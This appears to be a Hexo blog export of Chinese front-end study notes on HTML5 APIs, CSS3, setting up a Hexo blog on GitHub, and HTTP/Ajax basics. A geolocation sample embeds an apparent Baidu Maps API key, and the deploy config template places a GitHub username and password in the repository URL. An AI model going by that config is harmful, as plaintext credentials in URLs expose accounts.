if(this.classList.contains(&#39;active&#39;)) return false; !如果已经有active 不做任何操作! this.classList.remove(&#39;active&#39;); !清除class! this.classList.add(&#39;active&#39;); !当没有选中的时候 添加class active! Node.classList.add(&#39;class&#39;) 添加class Node.classList.remove(&#39;class&#39;) 移除class Node.classList.toggle(&#39;class&#39;) 切换class，有则移除，无则添加 Node.classList.contains(&#39;class&#39;) 检测是否存在class Node指一个有效的DOM节点，是一个通称 自定义属性 在HTML5中我们可以自定义属性，其格式如下data-*=””； 如：data-info=”我是自定义属性”，通过Node.dataset[‘info’]可获取到自定义的属性值。 Node.dataset是以类数组形式存在的 当我们设置data-my-name=”itcast”，则需要以驼峰格式才能正确获取（Node.dataset[‘myName’]） jQuery的自定义属性方法data(); 操作内存 当没有设置过data的时候可以取到dom上的属性 当我们设置过data之后 取的就是内存的 user-name userName 驼峰命名和普通的类名都可以取到值 直接操作DOM;nav.dataset[&#39;userName&#39;] = &#39;xgc&#39;; 必须是驼峰命名 全屏 webkitRequestFullScreen() 视频播放器案例 视频播放的方法、属性、事件 history history.go(); 正为前进，负为后退 history.back(); 后退 history.forward(); 前进 history.pushState({key: &#39;itcast&#39;}, &#39;标题变没变&#39;, &#39;/test.html&#39;); pushState可以往历史记录添加一条记录 history.replaceState(null, &#39;title&#39;, &#39;./test.html&#39;); 替换历史记录 window.onpopstate = function (state) {console.log(state);} 监听历史的变化？只有在点后退前进时调用 本地存储sessionStorage; window.sessionStorage.setItem(key, val); 存一个数据 var val = window.sessionStorage.getItem(key); 读取一个数据 var val = window.sessionStorage.removeItem(key); 删除一个数据 window.sessionStorage.clear(); 清空一个数据 localStorage window.localStorage.setItem(key, val); 存一个数据 var val = window.localStorage.getItem(key); 读取一个数据 var val = window.localStorage.removeItem(key); 删除一个数据 window.localStorage.clear(); 清空一个数据 geolocation12345678910111213141516171819202122232425/*引入百度地图*/&lt;script src="http://api.map.baidu.com/api?v=2.0&amp;ak= 0A5bc3c4fb543c8f9bc54b77bc155724"&gt;&lt;/script&gt;&lt;script&gt; /*如果存在这个属性就说明浏览器支持定位*/ if(navigator.geolocation) &#123; navigator.geolocation.getCurrentPosition(function (position) &#123; var latitude = position.coords.latitude; // 纬度 var longitude = position.coords.longitude; // 经度 console.log(position); /********************/ // 这些都是写死 var map = new BMap.Map("container"); // container表示主到哪个容器 // 把经度纬度传给百度 var point = new BMap.Point(longitude, latitude); map.centerAndZoom(point, 15); /****************************/ // 只写上面三行就可出现地图了，并且会定位 // 定义好了一个图片标记 var myIcon = new BMap.Icon("http://developer.baidu.com/map/jsdemo/img/fox.gif", new BMap.Size(300, 157)); // 创建标注 var marker = new BMap.Marker(point, &#123;icon: myIcon&#125;); map.addOverlay(marker); &#125;); &#125;&lt;/script&gt; 缓存技术12345678910111213141516CACHE MANIFESTCACHE:#此部分写需要缓存的资源 （#是注释的意思）./images/img1.jpg./images/img2.jpg./images/img3.jpg./images/img4.jpg./images/img5.jpgNETWORK: #此部分要写需要有网络才可访问的资源，无网络刚不访问./js/main.js*FALLBACK:#当访问不到某个资源的情况下，自动由另一个资源替换./css/online.css ./css/offline.css./online.html ./offline.html 123456789101112131415161718&lt;!DOCTYPE html&gt;&lt;!--是不是做离线缓存 缓冲清单--&gt;&lt;html lang="en" manifest="./study.appcache"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Application Cache&lt;/title&gt; &lt;link rel="stylesheet" href="./css/main.css"&gt; &lt;link rel="stylesheet" href="./css/online.css"&gt;&lt;/head&gt;&lt;body&gt; &lt;img src="./images/img1.jpg"&gt; &lt;img src="./images/img2.jpg"&gt; &lt;img src="./images/img3.jpg"&gt; &lt;img src="./images/img4.jpg"&gt; &lt;img src="./images/img5.jpg"&gt; &lt;script src="./js/main.js"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 拖拽关键代码&lt;div class=&quot;box&quot; draggable=&quot;true&quot;&gt;&lt;/div&gt; 拖拽元素 drag dragleave dragstart dragend 目标元素 dragover 在目标元素上移动 drop dragleave e.preventDefault(); 阻止浏览器默认行为 文件上传文件选择的一个事件file.onchange 123456789101112131415&lt;body&gt; &lt;input type="file" class="file" multiple&gt; &lt;script&gt; /*文件对象*/ var file = document.querySelector('.file'); /*文件选择的一个事件*/ file.onchange = function () &#123; var reader = new FileReader(); reader.readAsDataURL(this.files[0]); reader.onload = function (ev) &#123; document.querySelector('#img').src = this.result; &#125; &#125; &lt;/script&gt;&lt;/body&gt; 网络监听的事件123456789101112131415&lt;script src="jquery.min.js"&gt;&lt;/script&gt;&lt;script&gt; // 网络监听的事件 // 10 online 在线 offline 离线 // 事件是给window绑订的 // 通过window.navigator.onLine可以返回当前的网络状态 window.addEventListener('online', function () &#123; //alert('online'); $('.tips').text('网络已连接').fadeIn(500).delay(1000).fadeOut(); &#125;); window.addEventListener('offline', function () &#123; //alert('offline'); $('.tips').text('网络已断开').fadeIn(500).delay(1000).fadeOut(); &#125;);&lt;/script&gt; canvas简介使用 canvas 绘图 一定要有一个 canvas 标签. canvas 标签不能够绘图, 它只是画布, 但是它可以获得绘图工具对象. 绘图工具对象提供了各种绘图的 api( 函数, 方法 ), 需要绘制什么形状的时候就调用什么方法即可. 获得绘图工具对象 canvas.getContext(&#39;2d&#39;); // ‘webgl’ 具体如下： 12345&lt;canvas width="600" height="300"&gt; 你好, 您的浏览器不支持 Canvas, 请升级....&lt;/canvas&gt;var cases = document.getElementsByTagName('canvas');var context = cases[0].getContext("2d"); canvas.getContext 的 API状态：凡是涉及到 颜色, 线宽, 虚线, 线帽, 拐点, 描边, 填充 等等都是绘图时的状态. context.beginPath(); // 开启一个新的路径 实际上, 开始绘图的时候: 系统就默认的有一个 beginPath 行为 如果一个阶段绘制结束了, 需要开启一个新的 beginPath 接着绘制另一个阶段的图像.这个阶段就是状态. 这个状态就是指:线宽, 颜色, 端点状态, 线状态, 描边还是填充 在开启新路径时, 绘制工具的状态数据会被继承下来,即前面设置的状态会被后面保留, 如果需要启用原来的状态有两个方法 手动设置状态 存储恢复状态 使用场景: 如果绘制了一个图形, 但是临时要绘制另一个图形 在绘制完这个图形后, 还需要回到原来的状态中继续绘制 context.moveTo( x, y ); 告诉计算机从什么地方开始绘制 context.lineTo( x, y ); 告诉计算机从当前位置描点到哪里 context.stroke(); 描边，将前面描点用线依次连接起来 context.fill(); 填充 如果描点的曲线不闭合,那么将自动将起点与终点连接起来填充 context.lineWidth = 数字; 设置线宽 context.strokeStyle = 表示颜色的字符串; 描边颜色 context.fillStyle = 表示颜色的字符串; 填充颜色 context.font = &#39;50px 黑体&#39;; 设置字体 context.setLineDash(数组); 绘制虚线 数组是描述实部与虚部的长度. 为[]时表示绘制实线; [value1,value2]表示虚线的实部和虚部; [val1,val2,val3,…]表示虚线的实部和虚部交替取值，取完之后再循环取值。 context.save(); 保存当前状态,那么后面可以对状态做任何修改 context.restore(); 在想要回到原来的状态时, 调用此方法 context.closePath(); 如果是绘制闭合的曲线, 那么最后可以使用 如果绘制的折线, 那么两条线段之间会自动补全尖角 如果不是连续的折线, 那么闭合的两条线段, 是不会补全尖角 应用：可以利用x，y的坐标的数学函数的关系来绘制各种曲线 context.strokeRect(x坐标,y坐标,宽,高); 描边矩形 context.fillRect(x坐标,y坐标,宽,高); 填充矩形 context.clearRect(x坐标,y坐标,宽,高); 擦除矩形区 应用：做动画 context.arc(x坐标,y坐标,半径,起始角,终点角度); 角度是弧度制 context.strokeText(&#39;测试文字&#39;,100,100 ); 描边文本 context.fillText(&#39;测试文字&#39;,300,100); 填充文本 绘图第一种用法,将整个图片按照本身的宽高绘制到绘布上 context.drawImage(img,x轴坐标,y轴坐标); 绘图第二种用法, 将图绘制在指定的矩形区域内 var img = document.createElement( &#39;img&#39; ); 绘图时首先需要准备图片 img.src = ‘1.jpg’; context.drawImage(img,x轴坐标,y轴坐标,宽,高); 第三种绘制图片的方法，绘制精灵图(结合setInterval();方法做一些动画) context.drawImage(图片,截取精灵图的x,截取精灵图的y,截取宽度w,截取高度度h,放在画布上的x坐标,放在画布上的y坐标,图片所占画布的宽,图片所占画布的高); context.translate(x,y); 坐标平移变换 context.rotate(弧度); 坐标旋转变换，最简单应用：旋转的正方形 context.scale(x,y); 左边伸缩变换(x或y缩放的倍数,如果是1表示不缩放)最简单应用一：椭圆 注：变换是可以累加的 非零环绕原则在 canvas 绘图中是使用路径描线的方法绘制图形 描点时的顺序有一定的作用, 在描点时围绕起来的图形满足 “非零环绕原则” 的区域就会被镂空起来如果不满足就会被填充. 计算的值为 0 就 镂空, 如果非零就是填充 从图形的内部拉一个箭头, 以箭头的起点为圆心 检查穿过箭头的线, 以箭头起点为圆心如果顺时针记为 +1 如果逆时针记为 -1, 最后求和, 如果为 0 则镂空, 如果非零 则填充 圆上坐标的计算公式12x = x0 + r * Math.cos( 弧度 );y = y0 + r * Math.sin( 弧度 ); 补充 ES5 中对数组做了扩展, 引入了 forEach 和 map 等方法 ES6 中引入了 箭头函数 arrow function 简化函数的书写( 还有其他特征 ) 函数不写 function 参数如果只有一个 不写圆括号 参数与函数体用 =&gt; 连接 函数体如果只有一句话可以省略花括号 如果函数体只有一句话, 且返回数据, 可以省略 return 如：var maxX = Math.max.apply( null, points.map(function (v) { return v.x; })); 简写成：var maxX = Math.max.apply( null, points.map(v=&gt;v.x) );]]></content>
      <categories>
        <category>HTML5系列</category>
      </categories>
      <tags>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSS3知识体系]]></title>
    <url>%2F2016%2F01%2F01%2FCSS3%E7%9F%A5%E8%AF%86%E4%BD%93%E7%B3%BB%2F</url>
    <content type="text"><![CDATA[私有前缀 在pc端开发的时候 使用css3属性 最好加上私有前缀 -webkit-border-radius: 50%; 谷歌 -moz-border-radius: 50%; 火狐 -o-border-radius: 50%; 欧鹏 -ms-border-radius:50%; IE 选择器属性选择器 [attribute] 选择到所有包含 attribute 这个属性的元素 [attribute=value] 选择到所有包含 attribute 这个属性的元素 并且属性值 只能等于value [attribute!=value] jquery才有，css 是没有这个选择器 选择到所有包含 attribute 这个属性的元素 并且属性值 只能不等于value [attribute^=value] 选择到所有包含 attribute 这个属性的元素 并且属性值 以value开头 [attribute$=value] 选择到所有包含 attribute 这个属性的元素 并且属性值 以value结尾 [attribute*=value] 选择到所有包含 attribute 这个属性的元素 并且属性值 包含value这个字符 [attribute1][attribute2] 伪类选择器序伪类选择器 E:first-child 以E为子元素 确定父级元素 找它的第一个子元素 并且还要是E E:last-child 以E为子元素 确定父级元素 找它的最后一个子元素 并且还要是E E:nth-child(n) 以E为子元素 确定父级元素 找它的第n个子元素 并且还要是E(有效 1-无穷) n遵循线性变化，其取值0、1、2、3、4、… 但是当n&lt;=0时，选取无效。 n可是多种形式：nth-child(2n)、nth-child(2n+1)、nth-child(-1n+5)等; n注意:位置的关系(n一定要放在表达式的前面) :empty 元素为空时选中 :target 目标伪类选择器，它选中的当前锚点 伪元素选择器 :not([name=&quot;special&quot;]) 不包含该属性的选中 ::before ::after 伪元素选择器 (知识重点) ::first-letter 首个文字的选着器 必须是一个块级元素 ::first-line 首行 ::selection 文本选择中的变样式：背景色，颜色等 颜色opacity只能针对整个盒子设置透明度，子盒子及内容会继承父盒子的透明度 transparent只能针对整个盒子设置透明度，子盒子及内容会继承父盒子的透明度 rgba(0,0,0,0.5);Red、Green、Blue、Alpha hsla(240, 100%, 40%, 0.6);通过hsla我们可以对颜色的透明度进行控制, （色调，饱和度，亮度，透明度） 文本阴影 text-shadowtext-shadow:3px 3px 5px #000,-6px -6px 5px red; 第一个参数 x轴的偏移量 第二个参数 y轴的偏移量 第三个参数 阴影的长度 第四个参数 阴影的颜色 盒模型百分比宽度的时候怎么防止溢出 CSS3中可以通过box-sizing 来指定盒模型，即可指定为content-box、border-box，这样我们计算盒子大小的方式就发生了改变。 可以分成两种情况： box-sizing: border-box 计算方式为 width = border + padding + content box-sizing: content-box 计算方式为 width = content 兼容性比较好 display:block; 解决图片下间隙 边框边框圆角 border-radius border-radius: 50px 10px 50px 10px; border-radius: 100px 100px 100px 100px / 100px 100px 100px 100px; 边框阴影 box-shadow box-shadow: -3px -3px 2px red inset,3px 3px 2px #ccc; 水平偏移量 正值向右 负值向左； 垂直偏移量 正值向下 负值向上； 模糊度是不能为负值；(如果有五个属性 第四个属性是阴影的延伸) inset可以设置内阴影； 设置边框阴影不会改变盒子的大小，即不会影响其兄弟元素的布局。 可以设置多重边框阴影，实现更好的效果，增强立体感 边框图片 border-image切割的尺寸是不带单位 默认的单位是 px border-image: url(&quot;./images/border.png&quot;) 27/20px round; border-image-source: url(&quot;./images/border_image_2.png&quot;); 边框图片资源 border-image-slice: 33; 边框图片切割的尺寸 border-image-width: 20px; 边框图片宽度 自适应显示图片内容 border-image-repeat: round; 边框图片平铺方式 round 环绕的形式 repeat 平铺 以中心位置向两侧平铺 默认stretch 拉伸 背景背景-尺寸 background-size background-size: 600px 400px; 宽和高 background-size: 100% auto; 是基于容器的宽度和高度来计算 不是本身 background-size: auto 100%; 等比例缩放 background-size: contain; 让背景图 完全显示在盒子里头 background-size: cover; 让背景图 完全铺满整个盒子 背景-原点 background-origin background-origin: padding-box; 背景原点位置 默认是从内边距开始 background-origin: content-box; 背景原点位置 默认是从内容开始 background-origin: border-box; 背景原点位置 默认是从边框开始 背景-裁剪 background-clip background-clip:border-box; 背景图的裁剪 默认的裁剪的位置 border-box background-clip: padding-box; 背景图的裁剪 除了边距内的背景 裁剪掉了 background-clip: content-box; 背景图的裁剪 除了内容内的背景 裁剪掉了 背景-多背景（以逗号分隔可以设置多背景，可用于自适应局）123456background: url("images/bg1.png") left top no-repeat, url("images/bg2.png") right top no-repeat, url("images/bg3.png") right bottom no-repeat, url("images/bg4.png") left bottom no-repeat, url("images/bg5.png") repeat； 渐变线性渐变（指沿着某条直线朝一个方向产生渐变效果） background-image: linear-gradient(to right,yellow,blue); background-image: linear-gradient(90deg,transparent,black); 0deg 从下往上 顺时针是正的 0% - 50% 宽度内的渐变 百分比设置多个渐变的区间 12345678910background-image: linear-gradient(45deg, yellow 0% , yellow 25%, blue 25%, blue 50%, yellow 50%, yellow 75%, blue 75% , blue 100%); 径向渐变（从一个中心点开始沿着四周产生渐变效果）1.放射半径;2.中心圆点;3.起始颜色;4.结束颜色 radial-gradient(150px at 80px 80px,yellow,blue); 过渡 transitiontransition: all 1s linear 1s; transition-property: all; 需要产生过渡的属性 all所有的 transition-duration: 1s; 完成一个状态到另一个状态的过渡时间 transition-timing-function: linear; 过渡的 速度 匀速 先快后慢 先慢后快 transition-delay: 1s; 过渡延时 backface-visibility 设置元素背景是否可见 2D转换缩放 transform: scale(2, 2); x轴方向的缩放比,y轴方向的缩放比 移动 transform: translate(10%,0px); x轴方向的移动,y轴方向的移动,百分比 基于他本身的 旋转 transform: rotate(-90deg); 如果是正值,是顺时针旋转;如果是负值 ,是逆时针旋转 旋转原点 transform-origin: left center; 倾斜 transform: skew(45deg,0deg); x轴 正值是逆时针 y轴正值是顺时针 3D转换 rotateX(180deg); 如果是负的 就是顺时针 正的是逆时针 perspective: 100px; 透视 transform-style: preserve-3d; 透视 CSS3 动画 声明 @keyframes 关键字 动画序列的名称 ｛｝ keyframes move{节点} from 0% to 100% 还可以通过百分比来设置节点 animation-name: move; 动画序列的名称 animation-duration: 2s; 动画执行的总时间 animation-timing-function: ease; 动画执行的速度 ease linear ease-in ease-in-out ease-out animation-delay: 1s; 动画延时 animation-fill-mode: forwards; 动画结束的时候的状态 forwards 保持结束状态 backwards 回答最原生的状态 没有动画的那个状态 animation-iteration-count: infinite; 动画执行的次数 次数 特殊的值 infinite 执行无数次 animation-direction:alternate; 动画逆播放 animation-play-state:paused; 执行的状态 是执行中 暂停 running、paused 分步执行 steps(3) 多列布局 box-sizing: border-box; -webkit-column-count: 4; 指定列数 -webkit-column-width: 400px; 指定列宽 -webkit-column-rule: 2px dashed #CCC; 定义边框线 和 border一样 -webkit-column-gap: 50px; 调整列间距 伸缩布局 display: flex; flex-direction: column; flex-direction： row column row-reverse column-reverse 调整主轴方向（默认水平） justify-content： flex-start（起始点对齐） flex-end（终止点对齐） center（居中对齐） space-around（四周环绕） space-between（两端对齐） (调整主轴对齐) align-items：(调整测轴对齐) flex-start（侧轴起始点对齐） flex-end（侧轴终止点对齐） center（侧轴居中对齐） stretch（拉伸） flex-wrap：(控制是否换行) wrap（自动换行） nowrap（不自动换行） align-content：(堆栈（由flex-wrap产生的独立行）对齐) flex-start（起始点对齐） flex-end（终止点对齐） center（居中对齐） space-around（四周环绕） space-between（两端对齐） stretch（拉伸） flex-flow： flex-flow 是 flex-direction 和 flex-wrap 的简写形式 flex 控制子元素伸缩比例align-self同 align-items 可覆盖父元素设置的 algin-items，包括 flex-start、flex-end、center、stretch order 控制子元素的顺序web字体(28) 申明 自定义的字体 12345678910@font-face &#123; /*字体的名称 自定义*/ font-family: 'itcast-font'; /*引入字体文件 格式都市固定的 */ src: url("../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.svg") format("svg"), url("../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.ttf") format("truetype"), url("../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.woff") format("woff"), url("../fonts/LiDeBiao-Xing3/LiDeBiao-Xing3.eot") format("embedded-opentype");&#125; 字体图标1&lt;link rel="stylesheet" href="../fonts/font-awesome-4.4.0/css/font-awesome.css"/&gt; 定制自已的字体图标库 http://iconfont.cn/ https://icomoon.io/ 切割轮播图(28)123456789101112131415$('body').on('click','.prev',function()&#123; /*上一张*/ index ++; $('.view li').css(&#123;'transition':'all 1s','transform':'rotateX('+index*90+'deg)'&#125;).each(function(i,t)&#123; $(this).css('transition-delay',i*0.25+'s'); &#125;);&#125;).on('click','.next',function()&#123; /*下一张*/ index --; $('.view li').css(&#123;'transition':'all 1s','transform':'rotateX('+index*90+'deg)'&#125;).each(function(i,t)&#123; $(this).css('transition-delay',i*0.25+'s'); &#125;);&#125;); 兼容性 http://caniuse.com/ 可查询CSS3各特性的支持程度，一般兼容性处理的常见方法是为属性添加私有前缀]]></content>
      <categories>
        <category>CSS3系列</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Hexo+Github博客搭建]]></title>
    <url>%2F2015%2F12%2F28%2F%E4%BD%BF%E7%94%A8Hexo%2BGithub%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[Hexo+github可以随心所欲的部署属于自己的博客。 Hexo 博客搭建步骤参考文章: 搭建博客，首先需要安装 node 环境；安装Node.js和配置好Node.js环境，打开cmd命令行，成功界面如下 测试安装成功与否：打开终端，输入 node -v, 有输出版本结果则安装成功。 安装node环境的时候，已经自动安装了 npm 命令行工具，不需要单独安装。 可以通过 npm -v 测试npm是否可用 npm 是一个用来安装和管理 Node 包和前端包的一个工具。 npm 的两层含义 npm网站：https://www.npmjs.com/ 一个提供了一个用来共享或者检索的一个平台 二是托管 node 环境或者浏览器环境用到的一些第三方包 是一个命令行工具，可以用来下载 npm 网站上托管的包 CLI：Command Line Interface 命令行接口 GUI：图形化接口 npm 基本使用 本地安装1$ npm install [--save] 包名 一般是在项目中，安装项目使用的依赖包,就可以在终端中，切换到项目的根目录，然后执行 npm install 包名，npm 工具会自动将这个包下载下来然后放到 node_modules 目录中。node_modules 目录如果不存在会新建，如果已存在，则直接将下载的包放到该目录中。 包说明文件：package.json包说明文件其实就是一个产品的说明书：package.json 文件。该文件一般只存在于项目的根路径下，可以通过 npm init 命令使用向导的形式创建该文件。 该文件中描述了项目的一些元数据，例如 name、version、author等信息。 其中有一个非常重要的属性，叫做：dependencies，该属性是一个对象，里面保存了当前项目的依赖项，该字段一般不要手动修改，它需要结合 npm install --save 包名 来使用，只要在安装的时候加上--save 参数就会自动将包依赖项添加到该属性中，很方便。 甚至还可以完全把 node_modules 目录删除掉，只要 package.json文件还在，就可以执行 npm install 安装包说明文件中的所有的依赖项。执行 npm install 命令的时候，它会自动查询当前目录下的 package.json 文件，然后找到里面的 dependencies 属性，依次下载到 node_modules 目录下。 建议使用 npm 的时候，都先初始化一个 package.json 文件，然后安装包的时候最好都加上 --save 参数，将依赖项添加到包说明文件中。 全局安装全局安装：一般用于安装一些命令行工具（这些工具也是基于Node开发的。） 全局安装使用 npm install --global 包名（工具名），在任意目录执行该命令都可以。 1npm install -g hexo-cli 安装完成后可以测试下是否安装成功 可以通过 npm root -g 查看全局包安装目录。 安装 git 环境；下载地址： 安装Git和配置好Git环境，安装成功的象征就是在电脑上任何位置鼠标右键能够出现如下两个选择 注意：一般出于安全考虑，只有在Git Bash Here中才能进行Git的相关操作。如果需要在cmd命令行里调用Git，那么就要配置电脑的环境变量Path，或者在安装的时候选择use Git from the Windows Command Prompt。这个可有可无，影响不大，成功配置的界面如图 初始设置12$ git config --global user.name "yourname"$ git config --global user.email "your_email@example.com" 全局安装 hexo-cli在终端的任意目录输入 npm install -g hexo-cli 然后回车执行等待全局安装成功 通过输入 hexo --version 如果看到输入一大堆的版本号就说明安装成功了，Hexo 是一个命令行应用程序 初始化一个博客存储目录通过输入 hexp init 博客项目存储目录 Hexo 会在执行该命令的目录下生成一个博客项目，初始化博客项目的过程需要联网 通过终端进入刚才创建的博客项目目录，然后在该目录下输入 npm install 回车等待执行结束 启动本地服务器，查看博客内容输入 hexo server回车执行，这一执行会在本地启动一个服务器，然后通过 http://localhost:4000 / localhost:4000 就可以访问创建的博客项目 (如果此时4000端口号被占用，也可以通过 hexo server -p 5000 切换到端口号为5000，随即访问http://localhost:5000 / localhost:5000访问创建的博客项目) 创建博文进入博客项目，输入 hexo new 文章名称 创建博文 这个命令会自动在 source/_posts/ 目录下生成一个 文章名称.md 文件 生成静态文件：hexo generate该命令会自动在项目的根目录下的 public 目录下降静态文件放进去 配置主题页根据我个人所选的主题介绍。进入博客根目录，打开_config开始配置，注意：在配置主题页的时候需要图片的url，需要在七头云CDN注册； 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# Sitetitle: HongqinMa # 配置博客标题subtitle: "博客标签"description: "马红琴在 Github 上的个人博客"author: Hongqin Maheader-img: //ofy7k3v4s.bkt.clouddn.com/mbanner.png #email: hongqin_ma@126.com # 邮箱地址keyword: Hiraku, HongqinMa, javascript, html, css, nodejs #SEO搜索引擎查找关键词favicon: //ofy7k3v4s.bkt.clouddn.com/mylogo.png # 博客网站图标# RSS:weibo_username: Hiraku_Ma #微博账户名zhihu_username: HirakuMa #知乎账户名github_username: HongqinMa #github账户名twitter_username: HongqinMa #Twitter账户名facebook_username: Hiraku #Facebook账户名sidebar-about-description: 拼着一切代价，奔你的前程。 # 侧边栏签名sidebar-avatar: http://ofy7k3v4s.bkt.clouddn.com/photo.jpg # 侧边栏头像cdn-url: "https://ofy7k3v4s.bkt.clouddn.com/" # 我写的是七头云的域名地址theme: hexo-theme-Anisina # 主题名称friends: [ &#123; title: "掘金", href: "http://gold.xitu.io/" &#125;, &#123; title: "segmentfault", href: "https://segmentfault.com/" &#125;, &#123; title: "简书", href: "http://www.jianshu.com/users/1cbb94e5ed4d/latest_articles" &#125;, &#123; title: "七牛云", href: "https://portal.qiniu.com/" &#125;, &#123; title: "博客园", href: "https://home.cnblogs.com/" &#125;, &#123; title: "Awesomes", href: "https://www.awesomes.cn/" &#125;]duoshuo_username: Hiraku #这里需要注册多说或者主题作者：haojen Ma 文档中的另外一种，作用都一样 ，用来评论的；deploy: type: git # 快速部署 repo: https://github用户名:github密码@github.com/HongqinMa/HongqinMa.github.io.git 快速部署 修改配置文件 在项目根路径下执行 npm install hexo-deployer-git --save 该命令 接下来就可以直接输入 hexo deploy --generate/简写 hexo d -g 自动发布到 github 上 更详细介绍如下：如何配置主题（以Next主题为例进行详细说明） Hexo-Next-主题优化(一)Hexo-Next-主题优化(二)Hexo-Next-主题优化(三)Hexo-Next-主题优化(四) OK，现在可以直接通过honeyyoung.github.io访问博客了。]]></content>
      <categories>
        <category>Hexo系列</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>npm</tag>
        <tag>blog</tag>
        <tag>github</tag>
        <tag>hexo</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ajax]]></title>
    <url>%2F2015%2F12%2F16%2FAjax%2F</url>
    <content type="text"><![CDATA[服务器、网络基础、相关知识介绍服务器介绍：常见的服务器软件有： 文件服务器：Server-U、FileZilla、VsFTP等（FTP是File Transfer Protocol文件传输协议）； 数据库服务器：oracle、mysql、SQL server、DB2、ACCESS等； 邮件服务器：Postfix、Sendmail等； HTTP服务器：Apache、Nginx、IIS、Tomcat、NodeJS等； 按照不同的划分标准，服务可划分为以下类型： (1) 服务器类型 按 服务类型 可分为： 文件服务器 数据库服务器 邮件服务器 Web服务器等； 按 操作系统 可分为： Linux服务器 Windows服务器等； 按 应用软件 可分为 Apache 服务器 Nginx 服务器 IIS 服务器 Tomcat 服务器 weblogic 服务器 WebSphere 服务器 boss 服务器 Node 服务器等 (2) HTTP服务器 即网站服务器，主要提供文档(文本、图片、视频、音频)浏览服务，一般安装Apache、Nginx服务器软件。 HTTP服务器可以结合某一编程语言处理业务逻辑，由此进行的开发，通常称之为服务端开发。 常见的运行在服务端的编程语言包括 php、java、.net、Python、Ruby、Perl等。 (3) 客户端介绍： 具有向服务器索取服务能力的终端，如比如 手机、电脑等，通过安装不同的客户端软件，可以获取不同的服务，比如通过QQ获得即时通讯服务、通过迅雷获得下载服务等。 常见的客户端软件：浏览器、QQ、迅雷、Foxmail等。 以浏览器为宿主环境，结合 HTML、CSS、Javascript等技术，而进行的一系列开发，通常称之为前端开发。 网络基础：IP地址 所谓IP地址就是给每个连接在互联网上的主机分配的一个32位地址。(就像每部手机能正常通话需要一个号码一样) 查看本机IP地址 ping、ipconfig、ifconfig（linux） 域名 由于IP地址基于数字，不方便记忆，于是便用域名来代替IP地址，域名是一个IP地址的“面具” 查看域名对应的IP地址 ping DNS服务 DNS（Domain Name System）因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。 简单的说就是记录IP地址和域名之间对应关系的服务。 查找优先级 本机 hosts 文件、DNS服务器 ipconfig /flushdns 刷新DNS 端口 端口号是计算机与外界通讯交流的出口，每个端口对应不同的服务。现实生活中，银行不同的窗口办理不同的业务。 查看端口占用情况 netstat -an 常见端口号 80、8080、3306、21、22 软件架构C/S结构 即Client、Server 在C/S结构的情况下，不同的服务需要安装不同的客户端软件， 比如QQ、迅雷、Foxmail 这种情况下安装的软件会越来越多，同时也有许多弊端，比如A出差，需要在B电脑上查收邮件，但是B电脑并未安装Foxmail等类似的客户端软件，这样不得不先去下载Foxmail，非常不方便。 B/S结构 即Broswer、Server 解决了C/S所带来的不便 将所有的服务都可以通过浏览器来完成（因为基本所有浏览器都安装了浏览器），但B/S也有一些不利，比如操作稳定性、流畅度等方面相对较弱。 网络传输协议常见协议 HTTP、HTTPS 超文本传输协议 FTP 文件传输协议 SMTP 简单邮件传输协议 http协议 超文本传输协议（HTTP，HyperText Transfer Protocol) 网站是基于HTTP协议的，例如网站的图片、CSS、JS等都是基于HTTP协议进行传输的。 HTML Hypertext Markup Language HTTP协议是由从客户机到服务器的请求(Request)和从服务器到客户机的响应(Response)进行了约束和规范。即HTTP协议主要由请求和响应构成。 常用请求方法 POST、GET、PUT、DELETE 请求由 4 部分组成 HTTP 请求方法或 “动作” 正在请求的 URL 一个可选的请求头集合。其中可能包括身份验证信息 一个可选的请求体 请求头 由请求方式、请求URL和协议版本构成 GET /day01/code/login.php?username=123&amp;password=123 HTTP/1.1 POST /day01/code/login.php HTTP/1.1 请求行 Host：localhost 请求的主机，发出请求的页面所在的域 Cache-Control：max-age=0 控制缓存 Accept / 接受的文档MIME类型 User-Agent 很重要，浏览器的用户代理字符串 Referer 从哪个URL跳转过来的，发出请求的页面 URL Accept-Encoding 可接受的压缩格式 If-None-Match 记录服务器响应的ETag值，用于控制缓存,此值是由服务器自动生成的 If-Modified-Since 记录服务器响应的Last-Modified值,此值是由服务器自动生成的 Accept-Charset 浏览器能够显示的字符集 Accept-Language 浏览器当前设置的语言 Connection 浏览器和服务器之间连接的类型 Cookie 当前页面设置的任何 Cookie 请求主体 即传递给服务端的数据 注：当以post形式提交表单的时候，请求头里会设置 Content-Type: application/x-www-form-urlencoded，以get形式当不需要 响应和响应报文响应由服务器发出，其规范格式为：状态行、响应头、响应主体。 服务器返回的 HTTP 响应包含 3 部分 一个数字和文字组成的状态码，用来显示请求的成功和失败 一个响应头集合 响应主体 状态行 由协议版本号、状态码和状态信息构成 HTTP/1.1 200 OK 响应头 Date ： 响应时间 Server ： 服务器信息 Last-Modified ： 资源最后修改时间 由服务器自动生成 ETag ： 资源修改后生成的唯一标识 由服务器自动生成 Content-Length ： 响应主体长度 Content-Type ： 响应资源的类型 响应主体 即服务端返回给客户端的内容； 状态码，常见的有: 200代表成功 304文档未修改 403没有权限 404未找到 500服务器错误 JavaScript 原生的 AjaxAjax 的技术核心是 XMLHttpRequest 对象。AJAX 不是一门的新的语言，而是对现有技术的综合利用。本质是在HTTP协议的基础上以异步的方式与服务器进行通信。 异步 指某段程序执行时不会阻塞其它程序执行，其表现形式为程序的执行顺序不依赖程序本身的书写顺序，相反则为同步。 其优势在于不阻塞程序的执行，从而提升整体执行效率。 XMLHttpRequest 对象浏览器内建对象，用于在后台与服务器通信(交换数据) ，由此我们便可实现对网页的部分更新，而不是刷新整个页面。 HTTP请求3个组成部分与XMLHttpRequest方法的对应关系 请求行 xhr.open(‘post’,’01.php’); 请求头 